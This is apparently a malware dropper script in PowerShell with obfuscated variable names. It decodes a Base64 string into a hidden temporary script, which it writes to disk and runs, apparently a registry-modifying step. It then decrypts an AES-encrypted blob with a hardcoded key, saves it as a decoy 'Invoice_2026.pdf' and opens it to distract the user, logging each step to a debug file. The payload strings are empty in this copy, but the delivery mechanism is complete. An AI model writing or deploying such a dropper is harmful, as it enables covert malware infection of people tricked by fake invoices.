$ErrorActionPreference='Continue'
try{
$aipmta=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''))
$tfgedi="$env:TEMP\tcueossw.ps1"
[IO.File]::WriteAllText($tfgedi,$aipmta,[Text.Encoding]::UTF8)
"[step1] reg script written to $tfgedi" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
. $tfgedi
"[step1] reg script done" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
$vwfxey=[Convert]::FromBase64String('LHd9ndmtFZwDNgC303aQEEhPEAl6FeHM/DO9h+zpCn4=')
$svafif=[Convert]::FromBase64String('BUIsiSKnXZN5zUR7IwEHWg==')
$brjzlo=[Convert]::FromBase64String('')
$mjgaeo=New-Object Security.Cryptography.AesManaged
$mjgaeo.Key=$vwfxey;$mjgaeo.IV=$svafif;$mjgaeo.Mode='CBC';$mjgaeo.Padding='PKCS7'
$wizvjb=$mjgaeo.CreateDecryptor()
$eimivw=New-Object IO.MemoryStream(,$brjzlo)
$jzxjsm=New-Object Security.Cryptography.CryptoStream($eimivw,$wizvjb,[Security.Cryptography.CryptoStreamMode]::Read)
$injuro=New-Object IO.MemoryStream
$jzxjsm.CopyTo($injuro);$mjgaeo.Dispose()
$edkacs="$env:TEMP\Invoice_2026.pdf"
[IO.File]::WriteAllBytes($edkacs,$injuro.ToArray())
"[step2] PDF written to $edkacs" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
Start-Process "$edkacs"
"[step3] PDF opened" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}catch{
"[ERROR] $($_.Exception.Message) at line $($_.InvocationInfo.ScriptLineNumber)" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}
